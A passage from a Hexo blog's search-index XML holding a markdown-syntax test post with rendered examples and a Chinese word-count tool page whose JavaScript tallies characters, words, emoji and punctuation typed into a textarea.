<div class="code-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">; boilerplate</span></span><br><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;some_name&quot;</span></span><br><span class="line"><span class="attr">authors</span> = [<span class="string">&quot;Author&quot;</span>]</span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;This is \</span></span><br><span class="line"><span class="string">a description&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[lib]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="variable">$&#123;NAME&#125;</span></span><br><span class="line"><span class="attr">default</span> = <span class="literal">True</span></span><br><span class="line"><span class="attr">auto</span> = <span class="literal">no</span></span><br><span class="line"><span class="attr">counter</span> = <span class="number">1_000</span></span><br></pre></td></tr></table></figure></div>
]]></content>
      <tags>
        <tag>測試</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown Style</title>
    <url>/test3/</url>
    <content><![CDATA[<hr>
<p>This post is originated from <a class="link"   href="https://gist.github.com/apackeer/4159268" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.</p>
<!-- more -->
<hr>
<h2 id="Headers">Headers</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br><span class="line"></span><br><span class="line">Alternatively, for H1 and H2, an underline-ish style:</span><br><span class="line"></span><br><span class="line"><span class="section">Alt-H1</span></span><br><span class="line"><span class="section">======</span></span><br><span class="line"></span><br><span class="line"><span class="section">Alt-H2</span></span><br><span class="line"><span class="section">------</span></span><br></pre></td></tr></table></figure></div>
<h1>H1</h1>
<h2 id="H2">H2</h2>
<h3 id="H3">H3</h3>
<h4 id="H4">H4</h4>
<h5 id="H5">H5</h5>
<h6 id="H6">H6</h6>
<p>Alternatively, for H1 and H2, an underline-ish style:</p>
<h1>Alt-H1</h1>
<h2 id="Alt-H2">Alt-H2</h2>
<h2 id="Emphasis">Emphasis</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">Emphasis, aka italics, with <span class="emphasis">*asterisks*</span> or <span class="emphasis">_underscores_</span>.</span><br><span class="line"></span><br><span class="line">Strong emphasis, aka bold, with <span class="strong">**asterisks**</span> or <span class="strong">__underscores__</span>.</span><br><span class="line"></span><br><span class="line">Combined emphasis with <span class="strong">**asterisks and <span class="emphasis">_underscores_</span>**</span>.</span><br><span class="line"></span><br><span class="line">Strikethrough uses two tildes. ~~Scratch this.~~</span><br></pre></td></tr></table></figure></div>
<p>Emphasis, aka italics, with <em>asterisks</em> or <em>underscores</em>.</p>
<p>Strong emphasis, aka bold, with <strong>asterisks</strong> or <strong>underscores</strong>.</p>
<p>Combined emphasis with <strong>asterisks and <em>underscores</em></strong>.</p>
<p>Strikethrough uses two tildes. <s>Scratch this.</s></p>
<h2 id="Lists">Lists</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> First ordered list item</span><br><span class="line"><span class="bullet">2.</span> Another item</span><br><span class="line"><span class="bullet">  *</span> Unordered sub-list.</span><br><span class="line"><span class="bullet">1.</span> Actual numbers don&#x27;t matter, just that it&#x27;s a number</span><br><span class="line"><span class="bullet">  1.</span> Ordered sub-list</span><br><span class="line"><span class="bullet">4.</span> And another item.</span><br><span class="line"></span><br><span class="line">   You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we&#x27;ll use three here to also align the raw Markdown).</span><br><span class="line"></span><br><span class="line">   To have a line break without a paragraph, you will need to use two trailing spaces.  </span><br><span class="line">   Note that this line is separate, but within the same paragraph.  </span><br><span class="line">   (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</span><br><span class="line"></span><br><span class="line"><span class="bullet">*</span> Unordered list can use asterisks</span><br><span class="line"><span class="bullet">-</span> Or minuses</span><br><span class="line"><span class="bullet">+</span> Or pluses</span><br><span class="line"><span class="bullet">-</span> Paragraph In unordered list</span><br><span class="line"></span><br><span class="line">  For example like this.</span><br><span class="line"></span><br><span class="line">Common Paragraph with some text.</span><br><span class="line">And more text.</span><br></pre></td></tr></table></figure></div>
<ol>
<li>First ordered list item</li>
<li>Another item</li>
</ol>
<ul>
<li>Unordered sub-list.</li>
</ul>
<ol>
<li>
<p>Actual numbers don’t matter, just that it’s a number</p>
</li>
<li>
<p>Ordered sub-list</p>
</li>
<li>
<p>And another item.</p>
<p>You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we’ll use three here to also align the raw Markdown).</p>
<p>To have a line break without a paragraph, you will need to use two trailing spaces.<br>
Note that this line is separate, but within the same paragraph.<br>
(This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</p>
</li>
</ol>
<ul>
<li>Unordered list can use asterisks</li>
</ul>
<ul>
<li>Or minuses</li>
</ul>
<ul>
<li>Or pluses</li>
</ul>
<ul>
<li>
<p>Paragraph In unordered list</p>
<p>For example like this.</p>
</li>
</ul>
<p>Common Paragraph with some text.<br>
And more text.</p>
<h2 id="Inline-HTML">Inline HTML</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span>To reboot your computer, press <span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>ctrl<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>alt<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>del<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>.<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>To reboot your computer, press <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>del</kbd>.</p>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span></span><br><span class="line"><span class="code">    &lt;dt&gt;Definition list&lt;/dt&gt;</span></span><br><span class="line"><span class="code">    &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    &lt;dt&gt;Markdown in HTML&lt;/dt&gt;</span></span><br><span class="line"><span class="code">    &lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;</span></span><br><span class="line"><span class="code">&lt;/dl&gt;</span></span><br></pre></td></tr></table></figure></div>
<dl>
    <dt>Definition list</dt>
    <dd>Is something people use sometimes.</dd>
<pre><code>&lt;dt&gt;Markdown in HTML&lt;/dt&gt;
&lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;
</code></pre>
</dl>
<h2 id="Links">Links</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">I&#x27;m an inline-style link</span>](<span class="link">https://www.google.com</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">I&#x27;m an inline-style link with title</span>](<span class="link">https://www.google.com &quot;Google&#x27;s Homepage&quot;</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">I&#x27;m a reference-style link</span>][<span class="symbol">Arbitrary case-insensitive reference text</span>]</span><br><span class="line"></span><br><span class="line">[<span class="string">I&#x27;m a relative reference to a repository file</span>](<span class="link">../blob/master/LICENSE</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">You can use numbers for reference-style link definitions</span>][<span class="symbol">1</span>]</span><br><span class="line"></span><br><span class="line">Or leave it empty and use the [link text itself]</span><br><span class="line"></span><br><span class="line">Some text to show that the reference links can follow later.</span><br><span class="line"></span><br><span class="line">[<span class="symbol">arbitrary case-insensitive reference text</span>]: <span class="link">https://hexo.io</span></span><br><span class="line">[<span class="symbol">1</span>]: <span class="link">https://hexo.io/docs/</span></span><br><span class="line">[<span class="symbol">link text itself</span>]: <span class="link">https://hexo.io/api/</span></span><br></pre></td></tr></table></figure></div>
<p><a class="link"   href="https://www.google.com" >I’m an inline-style link<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.google.com"  title="Google's Homepage">I’m an inline-style link with title<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://hexo.io" >I’m a reference-style link<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a href="../blob/master/LICENSE">I’m a relative reference to a repository file</a></p>
<p><a class="link"   href="https://hexo.io/docs/" >You can use numbers for reference-style link definitions<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Or leave it empty and use the <a class="link"   href="https://hexo.io/api/" >link text itself<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Some text to show that the reference links can follow later.</p>
<h2 id="Images">Images</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">hover to see the title text:</span><br><span class="line"></span><br><span class="line">Inline-style:</span><br><span class="line"></span><br><span class="line">![<span class="string">alt text</span>](<span class="link">https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">Reference-style:</span><br><span class="line">![<span class="string">alt text</span>][<span class="symbol">logo</span>]</span><br><span class="line"></span><br><span class="line">[<span class="symbol">logo</span>]: <span class="link">https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 2&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>hover to see the title text:</p>
<p>Inline-style:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hexo.io/icon/favicon-196x196.png"
                      alt="alt text" title="Logo Title Text 1"
                ></p>
<p>Reference-style:<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hexo.io/icon/favicon-196x196.png"
                      alt="alt text" title="Logo Title Text 2"
                ></p>
<h2 id="Code-and-Syntax-Highlighting">Code and Syntax Highlighting</h2>
<p>Inline <code>code</code> has <code>back-ticks around</code> it.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;JavaScript syntax highlighting&quot;</span>;</span><br><span class="line"><span class="title function_">alert</span>(s);</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;Python syntax highlighting&quot;</span></span><br><span class="line"><span class="built_in">print</span> s</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">No language indicated, so no syntax highlighting.</span><br><span class="line">But let&#x27;s throw in a &lt;b&gt;tag&lt;/b&gt;.</span><br></pre></td></tr></table></figure></div>
<h2 id="Tables">Tables</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">|                |ASCII                          |HTML                         |</span><br><span class="line">|----------------|-------------------------------|-----------------------------|</span><br><span class="line">|Single backticks|<span class="code">`&#x27;Isn&#x27;t this fun?&#x27;`</span>            |&#x27;Isn&#x27;t this fun?&#x27;            |</span><br><span class="line">|Quotes          |<span class="code">`&quot;Isn&#x27;t this fun?&quot;`</span>            |&quot;Isn&#x27;t this fun?&quot;            |</span><br><span class="line">|Dashes          |<span class="code">`-- is en-dash, --- is em-dash`</span>|-- is en-dash, --- is em-dash|</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th></th>
<th>ASCII</th>
<th>HTML</th>
</tr>
</thead>
<tbody>
<tr>
<td>Single backticks</td>
<td><code>'Isn't this fun?'</code></td>
<td>‘Isn’t this fun?’</td>
</tr>
<tr>
<td>Quotes</td>
<td><code>&quot;Isn't this fun?&quot;</code></td>
<td>“Isn’t this fun?”</td>
</tr>
<tr>
<td>Dashes</td>
<td><code>-- is en-dash, --- is em-dash</code></td>
<td>– is en-dash, — is em-dash</td>
</tr>
</tbody>
</table>
<p>Colons can be used to align columns.</p>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">| Tables        | Are           | Cool  |</span><br><span class="line">| ------------- |:-------------:| -----:|</span><br><span class="line">| col 3 is      | right-aligned |  |</span><br><span class="line">| col 2 is      | centered      |    |</span><br><span class="line">| zebra stripes | are neat      |   </span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>Tables</th>
<th style="text-align:center">Are</th>
<th style="text-align:right">Cool</th>
</tr>
</thead>
<tbody>
<tr>
<td>col 3 is</td>
<td style="text-align:center">right-aligned</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>col 2 is</td>
<td style="text-align:center">centered</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>zebra stripes</td>
<td style="text-align:center">are neat</td>
<td style="text-align:right"></td>
</tr>
</tbody>
</table>
<p>The outer pipes (|) are optional, and you don’t need to make the raw Markdown line up prettily. You can also use inline Markdown.</p>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">Markdown | Less | Pretty</span><br><span class="line">--- | --- | ---</span><br><span class="line"><span class="emphasis">*Still*</span> | <span class="code">`renders`</span> | <span class="strong">**nicely**</span></span><br><span class="line">1 | 2 | 3</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>Markdown</th>
<th>Less</th>
<th>Pretty</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Still</em></td>
<td><code>renders</code></td>
<td><strong>nicely</strong></td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
</tbody>
</table>
<blockquote>
<p>You can find more information about <strong>LaTeX</strong> mathematical expressions <a class="link"   href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
</blockquote>
<h2 id="Blockquotes">Blockquotes</h2>
<blockquote>
<p>Blockquotes are very handy in email to emulate reply text.<br>
This line is part of the same quote.</p>
</blockquote>
<p>Quote break.</p>
<blockquote>
<p>This is a very long line that will still be quoted properly when it wraps. Oh boy let’s keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can <em>put</em> <strong>Markdown</strong> into a blockquote.</p>
</blockquote>
<h2 id="Horizontal-Rule">Horizontal Rule</h2>
<p>Three or more…</p>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"></span><br><span class="line">Hyphens</span><br><span class="line"></span><br><span class="line"><span class="strong">***</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">Asterisks</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">___</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">Underscores</span></span><br></pre></td></tr></table></figure></div>
<hr>
<p>Hyphens</p>
<hr>
<p>Asterisks</p>
<hr>
<p>Underscores</p>
<h2 id="Line-Breaks">Line Breaks</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">Here&#x27;s a line for us to start with.</span><br><span class="line"></span><br><span class="line">This line is separated from the one above by two newlines, so it will be a <span class="emphasis">*separate paragraph*</span>.</span><br><span class="line"></span><br><span class="line">This line is also a separate paragraph, but...</span><br><span class="line">This line is only separated by a single newline, so it&#x27;s a separate line in the <span class="emphasis">*same paragraph*</span>.</span><br></pre></td></tr></table></figure></div>
<p>Here’s a line for us to start with.</p>
<p>This line is separated from the one above by two newlines, so it will be a <em>separate paragraph</em>.</p>
<p>This line is also a separate paragraph, but…<br>
This line is only separated by a single newline, so it’s a separate line in the <em>same paragraph</em>.</p>
<hr>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">This is a regular paragraph.</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="code">    &lt;tr&gt;</span></span><br><span class="line"><span class="code">        &lt;td&gt;Foo&lt;/td&gt;</span></span><br><span class="line"><span class="code">    &lt;/tr&gt;</span></span><br><span class="line"><span class="code">&lt;/table&gt;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">This is another regular paragraph.</span><br></pre></td></tr></table></figure></div>
<p>This is a regular paragraph.</p>
<table>
    <tr>
        <td>Foo</td>
    </tr>
</table>
<p>This is another regular paragraph.</p>
<h2 id="Youtube-videos">Youtube videos</h2>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">alt</span>=<span class="string">&quot;IMAGE ALT TEXT HERE&quot;</span> <span class="attr">width</span>=<span class="string">&quot;240&quot;</span> <span class="attr">height</span>=<span class="string">&quot;180&quot;</span> <span class="attr">border</span>=<span class="string">&quot;10&quot;</span> /&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">Pure markdown version:</span><br><span class="line"></span><br><span class="line">[<span class="string">![IMAGE ALT TEXT HERE</span>](<span class="link">https://img.youtube.com/vi/ARted4RniaU/0.jpg</span>)](<span class="link">https://www.youtube.com/watch?v=ARted4RniaU</span>)</span><br></pre></td></tr></table></figure></div>
<p><a href="https://www.youtube.com/watch?feature=player_embedded&v=ARted4RniaU
" target="_blank"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img.youtube.com/vi/ARted4RniaU/0.jpg"
                     
alt="IMAGE ALT TEXT HERE" width="240" height="180" border="10" 
                ></a></p>
<p>Pure markdown version:</p>
<p><a href="https://www.youtube.com/watch?v=ARted4RniaU"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img.youtube.com/vi/ARted4RniaU/0.jpg"
                      alt="IMAGE ALT TEXT HERE"
                ></a></p>
]]></content>
      <tags>
        <tag>測試</tag>
      </tags>
  </entry>
  <entry>
    <title>文章字數統計</title>
    <url>/words/</url>
    <content><![CDATA[<hr>

<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #f9f9f9;
            color: #333;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 100%;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .result {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
            width: 100%;
            padding: 0 20px;
        }

        .group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            width: 100%;
        }

        .metric-pair {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .value {
            min-width: 4ch;
            text-align: right;
            font-weight: bold;
        }

        textarea {
            width: 100%;
            min-height: 150px;
            padding: 12px;
            font-size: 16px;
            border-radius: 6px;
            border: 1px solid #ccc;
            box-sizing: border-box;
            background-color: #fff;
            color: #333;
            margin-bottom: 20px;
        }

        @media (min-width: 601px) {
            .group-triple {
                grid-template-columns: 1fr 1fr 1fr;
            }
        }

        @media (max-width: 600px) {
            .result {
                padding: 0 10px;
                gap: 10px;
            }

            .group, .group-triple {
                grid-template-columns: 1fr 1fr;
                gap: 10px;
            }

            .group-triple .metric-pair:nth-child(3) {
                grid-column: auto;
            }

            .group-triple:last-child {
                display: grid;
                grid-template-areas: 
                    "space punct"
                    "emoji emoji";
            }

            .metric-pair {
                margin: 0;
            }
        }

        body.dark-mode {
            background-color: #1e1e1e;
            color: #e0e0e0;
        }

        body.dark-mode textarea {
            background-color: #333333;
            color: #e0e0e0;
            border: 1px solid #444;
        }
    </style>
</head>
<body>
    <div class="container">
        <textarea id="textInput" placeholder="請輸入內容..." oninput="analyzeText()"></textarea>
        
        <div class="result">
            <div class="group">
                <div class="metric-pair">
                    <span>文章字數</span>
                    <span id="charCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>總字元數</span>
                    <span id="weightedCharCount" class="value">0</span>
                </div>
            </div>
            
            <div class="group">
                <div class="metric-pair">
                    <span>文字段落</span>
                    <span id="lineCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>總單字數</span>
                    <span id="englishWordCount" class="value">0</span>
                </div>
            </div>
            
            <div class="group group-triple">
                <div class="metric-pair">
                    <span>中文字數</span>
                    <span id="chineseCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>英文字數</span>
                    <span id="englishCharCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>數字數量</span>
                    <span id="numberCount" class="value">0</span>
                </div>
            </div>
            
            <div class="group group-triple">
                <div class="metric-pair">
                    <span>空格數量</span>
                    <span id="spaceCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>標點符號</span>
                    <span id="punctCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>Emoji🙂</span>
                    <span id="emojiCount" class="value">0</span>
                </div>
            </div>
        </div>
    </div>
    <script data-swup-reload-script type="text/javascript">
        function analyzeText() {
            const text = document.getElementById('textInput').value;

            const lineCount = text.split(/\r?\n/).filter(line => line.trim().length > 0).length;
            const chineseCount = (text.match(/[\u4e00-\u9fff]/g) || []).length;
            const englishWordCount = (text.match(/[a-zA-Z]+(?:[-'][a-zA-Z]+)*/g) || []).length;
            const englishCharCount = (text.match(/[a-zA-Z]/g) || []).length;
            const numberCount = (text.match(/\d/g) || []).length;
            const emojiMatches = (text.match(/[\uD83C-\uDBFF\uDC00-\uDFFF]/g) || []);
            const emojiCount = Math.floor(emojiMatches.length / 2);
            const punctCount = (text.match(/[^\w\s\u4e00-\u9fff\d]/g) || []).filter(char => !/[\uD83C-\uDBFF\uDC00-\uDFFF]/.test(char)).length;
            const spaceCount = (text.match(/\s/g) || []).length;

            const totalCharCount = chineseCount + englishCharCount + numberCount + punctCount + emojiCount + spaceCount;
            const weightedCharCount = (chineseCount * 2) + (englishCharCount * 1) + (numberCount * 1) + (punctCount * 1) + (emojiCount * 2) + (spaceCount * 1);

            document.getElementById('charCount').textContent = formatNumber(totalCharCount);
            document.getElementById('weightedCharCount').textContent = formatNumber(weightedCharCount);
            document.getElementById('lineCount').textContent = formatNumber(lineCount);
            document.getElementById('englishWordCount').textContent = formatNumber(englishWordCount);
            document.getElementById('chineseCount').textContent = formatNumber(chineseCount);
            document.getElementById('englishCharCount').textContent = formatNumber(englishCharCount);
            document.getElementById('punctCount').textContent = formatNumber(punctCount);
            document.getElementById('emojiCount').textContent = formatNumber(emojiCount);
            document.getElementById('numberCount').textContent = formatNumber(numberCount);
            document.getElementById('spaceCount').textContent = formatNumber(spaceCount);
        }

        function formatNumber(num) {
            if (num === 0) {
                return '0';
            }
            return num.toString().replace(/^0+/, ''); 
        }
        window.onload = analyzeText;
    </script>
</body>
</html>
]]></content>
      <categories>
        <category>小工具</category>
        <category>字數統計</category>
      </categories>
      <tags>
        <tag>小工具</tag>
        <tag>字數統計</tag>
      </tags>
  </entry>
</search>
